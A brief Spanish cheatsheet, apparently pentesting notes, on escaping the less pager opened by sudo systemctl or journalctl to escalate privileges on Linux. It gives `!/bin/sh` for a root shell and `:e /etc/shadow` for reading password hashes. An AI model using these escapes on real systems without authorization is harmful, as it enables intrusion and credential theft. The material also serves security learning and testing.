---
title: Privesc por pagers en Linux
description: Cheatsheet corto: escalar privilegios cuando sudo abre un pager (less) vía systemctl/journalctl, incluyendo lectura de ficheros como root.
tags:
  - linux
  - privesc
  - sudo
  - pager
  - less
  - systemctl
  - journalctl
  - gtfobins
sidebar_position: 20
---

# Privesc por pagers en Linux

Si `sudo` permite ejecutar un comando que abre un **pager interactivo** (normalmente `less`), puedes usar escapes del pager para **ejecutar comandos** (shell) o **leer ficheros** con los privilegios del proceso (habitualmente **root**).

---

## 1. Checklist

1) Ver permisos:

```bash
sudo -l
````

2. Buscar comandos que suelen abrir pager:
    

- `systemctl status …`
- `journalctl …`
- `man …`
- cualquier cosa que use `$PAGER`
    

3. Ejecutar el comando con sudo y, dentro del pager (`less`), usar:

- **Shell**: `!/bin/sh`
- **Leer otros ficheros**: `:e /ruta/al/fichero`

---

## 2. Escapes en `less`

### 2.1 Obtener shell (root)

Dentro de `less`:

```text
!/bin/sh
```

### 2.2 Leer ficheros como root (sin shell)

Dentro de `less`:

```text
:e /etc/shadow
```


---

## 3. Casos típicos

### 3.1 `systemctl status` → less → root

```bash
sudo systemctl status <servicio>
```

En `less`:

- Shell: `!/bin/sh`
- Leer fichero: `:e /etc/shadow`

### 3.2 `journalctl` → less → root

```bash
sudo journalctl -u <servicio>
```

En `less`:

- Shell: `!/bin/sh`
    
- Leer fichero: `:e /etc/shadow`
    

> Si no abre pager: necesitas TTY y suficiente output (reduce el tamaño de terminal o usa un servicio con más salida).

---

## 6. Referencias

- [https://gtfobins.org/gtfobins/less/](https://gtfobins.org/gtfobins/less/)
- [https://gtfobins.org/gtfobins/systemctl/](https://gtfobins.org/gtfobins/systemctl/)
- [https://gtfobins.org/gtfobins/journalctl/](https://gtfobins.org/gtfobins/journalctl/)
